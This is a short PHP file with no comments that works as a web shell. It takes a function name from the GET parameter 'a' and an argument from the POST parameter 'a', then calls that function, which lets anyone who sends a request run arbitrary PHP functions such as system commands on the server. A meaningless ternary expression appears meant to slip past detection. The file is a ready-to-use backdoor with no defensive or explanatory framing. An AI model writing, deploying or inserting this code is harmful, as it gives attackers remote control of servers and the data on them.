<?php
    $a=$_GET['a'];
    $b=$_POST['a'];
    call_user_func_array($a==$a?$a:$a, array($b));
?>